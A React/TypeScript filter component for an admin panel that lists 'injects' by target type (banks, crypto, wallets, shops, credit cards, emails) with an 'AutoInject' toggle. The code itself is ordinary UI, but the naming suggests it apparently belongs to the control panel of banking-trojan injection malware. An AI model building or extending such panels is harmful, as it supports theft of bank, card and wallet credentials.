import React from "react";
import {Col, Row, Select} from "antd";
import {BankFilled, CreditCardFilled, MailFilled, ShopFilled, WalletFilled} from "@ant-design/icons";
import {BitcoinIcon} from "../../Misc/CustomIcons";
import {changeInjectsFilters} from "../../../Store/Injections/Actions";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {AppState} from "../../../Store/RootReducer";

const {Option} = Select;

const InjectionsFilter: React.FC = () => {
    const dispatch = useAppDispatch();
    const injectionsReducer = useAppSelector((state: AppState) => state.injects);

    const changeTypeFilter = (type: string) => {
        dispatch(changeInjectsFilters({
            type: type,
        }));
    };

    const autoInjectFilter = (value: boolean|null) => {
        dispatch(changeInjectsFilters({
            autoInjects: value === undefined ? null : value,
        }));
    };

    const {t} = useTranslation();

    return (
        <div style={{width: 250}}>
            <h4>{t("FILTERS_BTN")}</h4>
            <Row>
                <Col span={24} style={{marginBottom: 15}} >
                    <Select
                        className="panel-select"
                        optionLabelProp="label"
                        placeholder={t("TYPE")}
                        allowClear
                        onChange={changeTypeFilter}
                        dropdownClassName="select-pop"
                        defaultValue={injectionsReducer.filters.type !== "" ? injectionsReducer.filters.type : null}
                    >
                        <Option
                            value="banks"
                            label={(
                                <>
                                    <BankFilled/> {t("SIDEBAR_NAV_BANKS")}
                                </>
                            )}
                        >
                            <BankFilled/> {t("SIDEBAR_NAV_BANKS")}
                        </Option>
                        <Option
                            value="crypt"
                            label={(
                                <>
                                    <BitcoinIcon/> {t("SIDEBAR_NAV_CRYPT")}
                                </>
                            )}
                        >
                            <BitcoinIcon/> {t("SIDEBAR_NAV_CRYPT")}
                        </Option>
                        <Option
                            value="wallets"
                            label={(
                                <>
                                    <WalletFilled/> {t("SIDEBAR_NAV_WALLET")}
                                </>
                            )}
                        >
                            <WalletFilled/> {t("SIDEBAR_NAV_WALLET")}
                        </Option>
                        <Option
                            value="shops"
                            label={(
                                <>
                                    <ShopFilled /> {t("SIDEBAR_NAV_SHOPS")}
                                </>
                            )}
                        >
                            <ShopFilled /> {t("SIDEBAR_NAV_SHOPS")}
                        </Option>
                        <Option
                            value="credit_cards"
                            label={(
                                <>
                                    <CreditCardFilled /> {t("SIDEBAR_NAV_CARDS")}
                                </>
                            )}
                        >
                            <CreditCardFilled /> {t("SIDEBAR_NAV_CARDS")}
                        </Option>
                        <Option
                            value="emails"
                            label={(
                                <>
                                    <MailFilled /> {t("SIDEBAR_NAV_EMAIL")}
                                </>
                            )}
                        >
                            <MailFilled /> {t("SIDEBAR_NAV_EMAIL")}
                        </Option>
                    </Select>
                </Col>
                <Col span={24}>
                    <Select
                        className="panel-select"
                        placeholder="AutoInject"
                        allowClear
                        onChange={autoInjectFilter}
                        dropdownClassName="select-pop"
                        defaultValue={injectionsReducer.filters.autoInjects}
                    >
                        <Option value={true}>AutoInject: {t("ON")}</Option>
                        <Option value={false}>AutoInject: {t("OFF")}</Option>
                    </Select>
                </Col>
            </Row>
        </div>
    );
};

export default InjectionsFilter;
